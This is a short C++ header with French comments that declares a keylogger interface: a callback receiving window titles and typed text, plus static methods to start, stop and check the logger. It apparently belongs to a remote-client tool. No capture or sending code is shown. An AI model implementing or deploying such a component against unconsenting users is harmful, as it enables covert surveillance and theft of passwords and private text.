#pragma once
#include <string>
#include <functional>

namespace rslm {
	namespace client {
		namespace messages {

			using KeylogCallback = std::function<void(const std::string& windowTitle,
				                                      const std::string& text)>;
			
			class KeyloggerHandler {
			public:
				//Demarre le Keylogger
				static void Start(KeylogCallback onKeylog);

				//Arrete le keylogger
				static void Stop();

				//Verifie si le keylogger est actif
				static bool IsRunning();
			};
		}//namespace messages
	}//namespace client
}//namespace rslm